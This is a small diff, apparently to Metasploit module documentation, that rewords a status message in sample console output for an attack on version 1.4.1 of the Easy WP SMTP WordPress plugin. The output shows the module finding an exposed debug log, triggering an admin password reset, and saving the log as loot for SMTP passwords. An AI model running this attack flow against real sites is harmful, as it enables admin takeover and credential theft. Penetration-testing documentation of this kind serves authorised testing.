@@ -64,7 +64,7 @@ rhosts => 1.1.1.1
 resource (wp_easy_wp_smtp.rb)> run
 [*] Checking /wp-content/plugins/easy-wp-smtp/readme.txt
 [*] Found version 1.4.1 in the plugin
-[+] Vulnerable version detected
+[+] Vulnerable version of Easy WP SMTP detected
 [+] Found debug log: /wp-content/plugins/easy-wp-smtp/5fcfd49e879f9_debug_log.txt
 [*] Sending password reset for Admin
 [+] Debug log saved to /home/h00die/.msf4/loot/20201208204705_default_1.1.1.1_5fcfd49e879f9_de_209239.txt.  Manual review for possible SMTP password, and other information.
@@ -84,7 +84,7 @@ verbose => true
 resource (easy-wp-smtp.rb)> run
 [*] Checking /wp-content/plugins/easy-wp-smtp/readme.txt
 [*] Found version 1.4.1 in the plugin
-[+] Vulnerable version detected
+[+] Vulnerable version of Easy WP SMTP detected
 [*] Checking for debug_log file
 [-] not-vulnerable: Either debug log not turned on, or directory listings disabled.  Try AGGRESSIVE mode if this is a false positive
 [*] Scanned 1 of 1 hosts (100% complete)
@@ -97,7 +97,7 @@ aggressive => true
 resource (easy-wp-smtp.rb)> run
 [*] Checking /wp-content/plugins/easy-wp-smtp/readme.txt
 [*] Found version 1.4.1 in the plugin
-[+] Vulnerable version detected
+[+] Vulnerable version of Easy WP SMTP detected
 [*] Checking for debug_log file
 [-] Debug file not found, bypassing check due to AGGRESSIVE mode
 [*] Sending password reset for Admin
